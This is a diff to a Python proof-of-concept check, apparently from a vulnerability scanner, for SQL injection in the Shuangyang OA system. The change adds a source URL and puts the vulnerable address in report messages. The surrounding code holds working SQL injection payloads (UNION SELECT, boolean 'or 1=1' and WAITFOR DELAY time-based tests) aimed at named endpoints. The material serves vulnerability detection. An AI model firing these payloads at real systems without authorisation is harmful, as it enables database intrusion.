@@ -21,7 +21,7 @@ class Vuln(ABVuln):
         /Office_Supplies/Goods_Main.aspx?type=1&info_id=1
         /FormBuilder/yjzxList.aspx?id=1
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0113260'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = '双杨OA系统'  # 漏洞应用名称
@@ -74,8 +74,8 @@ class Poc(ABPoc):
                     code, head, res, errcode, _ = hh.http(url + getdata)
                     if 'master' in res or 'qxzzq1qxxbq' in res:
                         #security_hole(url + "  :found sql Injection")
-                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                            target=self.target, name=self.vuln.name))
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                            target=self.target, name=self.vuln.name, url=url))
 
             payload = '/FormBuilder/PrintFormList.aspx?file_id=1'
             getdata = '%29%20UNION%20ALL%20SELECT%20CHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%2899%29%2bCHAR%2873%29%2bCHAR%28110%29%2bCHAR%2876%29%2bCHAR%2886%29%2bCHAR%2869%29%2bCHAR%2874%29%2bCHAR%28104%29%2bCHAR%2886%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28107%29%2bCHAR%28120%29%2bCHAR%28113%29%2CNULL--'
@@ -83,8 +83,8 @@ class Poc(ABPoc):
             code, head, res, errcode, _ = hh.http(url + getdata)
             if 'qxqxqbcInLVEJhVqpkxq' in res:
                 #security_hole(url + "  :found sql Injection")
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url))
 
             payload = '/FormBuilder/PrintFormList.aspx?file_id=1'
             getdata1 = '%29%20or%201%3D1--'
@@ -96,8 +96,8 @@ class Poc(ABPoc):
             m2 = re.findall('option', res2)
             if m1 != m2:
                 #security_hole(url + "  :found sql Injection")
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url))
 
             payload = '/FormBuilder/yjzxList.aspx?id=1'
             getdata = '%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
@@ -109,8 +109,8 @@ class Poc(ABPoc):
             t3 = time.time()
             if t3 - 2*t2 + t1 > 3:
                 #security_hole(url + "  :found sql Injection")
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
